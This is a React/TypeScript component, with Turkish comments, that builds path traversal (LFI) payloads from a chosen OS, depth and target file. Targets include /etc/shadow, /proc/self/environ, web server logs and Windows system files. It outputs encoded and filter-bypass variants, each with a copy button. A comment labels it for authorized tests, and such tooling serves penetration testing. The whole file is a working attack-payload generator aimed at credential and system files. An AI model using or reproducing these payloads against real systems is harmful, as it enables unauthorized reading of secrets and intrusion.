import { useState } from 'react';
import { copyText } from './copy';

// LFI ureteci — isletim sistemi + derinlik + hedef dosya -> traversal varyantlari
// (ham, slash-cevirme, cift-kodlama, ....//). Yetkili testler icin.
const FILES_NIX = ['/etc/passwd', '/etc/shadow', '/etc/hosts', '/proc/self/environ', '/var/log/apache2/access.log'];
const FILES_WIN = ['C:\\Windows\\win.ini', 'C:\\Windows\\System32\\drivers\\etc\\hosts', 'C:\\xampp\\apache\\logs\\access.log'];

export default function LfiGenerator() {
  const [os, setOs] = useState<'nix' | 'win'>('nix');
  const [depth, setDepth] = useState(4);
  const [file, setFile] = useState(FILES_NIX[0]);
  const [copied, setCopied] = useState<string | null>(null);

  const files = os === 'nix' ? FILES_NIX : FILES_WIN;
  const trav = os === 'nix' ? '../'.repeat(depth) : '..\\'.repeat(depth);
  const target = (file.startsWith('/') ? file.slice(1) : file.replace(/^[A-Z]:\\/i, ''));
  const base = trav + target;
  const variants = [
    base,
    base.replace(/\.\.\//g, '....//'),
    base.replace(/\//g, '%2f'),
    encodeURIComponent(encodeURIComponent(base)),
    ...(os === 'win' ? [base.replace(/\\/g, '/')] : [base.replace(/\//g, '\\/')]),
  ];

  const copy = async (v: string) => {
    if (await copyText(v)) { setCopied(v); setTimeout(() => setCopied(null), 1000); }
  };

  return (
    <div className="rounded-2xl border border-[#1E1E1E] bg-[#0A0A0A] p-5">
      <h3 className="text-[14px] font-bold text-white">LFI / Path Traversal</h3>
      <div className="mt-3 flex flex-wrap items-center gap-2">
        <div className="flex gap-1.5">
          {(['nix', 'win'] as const).map((o) => (
            <button key={o} onClick={() => { setOs(o); setFile((o === 'nix' ? FILES_NIX : FILES_WIN)[0]); }}
              className={`rounded-full border px-3 py-1 text-[12px] ${os === o ? 'border-[#FF9F0A] text-white' : 'border-[#2A2A2A] text-[#AAA]'}`}>
              {o === 'nix' ? 'Linux' : 'Windows'}
            </button>
          ))}
        </div>
        <label className="flex items-center gap-2 text-[12px] text-[#AAA]">derinlik
          <input type="range" min={1} max={10} value={depth} onChange={(e) => setDepth(Number(e.target.value))} aria-label="Traversal derinligi" className="accent-[#FF9F0A]" />
          <span className="font-mono text-white">{depth}</span>
        </label>
        <select value={file} onChange={(e) => setFile(e.target.value)} aria-label="Hedef dosya"
          className="rounded-lg border border-[#2A2A2A] bg-[#1A1A1A] px-2 py-1.5 font-mono text-[12px] text-white outline-none">
          {files.map((f) => <option key={f}>{f}</option>)}
        </select>
      </div>
      <div className="mt-3 space-y-1.5">
        {variants.map((v) => (
          <button key={v} onClick={() => copy(v)} title="Kopyalamak icin tikla"
            className="block w-full truncate rounded-lg bg-[#141414] px-3 py-1.5 text-left font-mono text-[12px] text-[#DDD] hover:text-white">
            {copied === v ? <span className="text-[#30D158]">kopyalandı ✓</span> : v}
          </button>
        ))}
      </div>
    </div>
  );
}
